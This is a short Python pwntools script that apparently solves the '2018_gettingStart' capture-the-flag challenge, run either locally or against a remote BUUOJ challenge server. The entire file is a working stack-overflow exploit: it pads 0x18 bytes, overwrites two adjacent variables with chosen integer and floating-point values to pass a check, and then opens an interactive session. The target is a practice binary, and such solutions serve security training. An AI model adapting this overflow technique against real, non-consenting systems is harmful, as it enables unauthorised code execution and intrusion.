#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process("./2018_gettingStart")
	elf = ELF("./2018_gettingStart")
else:
	p = remote('node3.buuoj.cn',26416)
	elf = ELF("./2018_gettingStart")

offset = 0x30 - 0x18

payload = 'A' * offset + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
sla("But Whether it starts depends on you.\n",payload)

ia()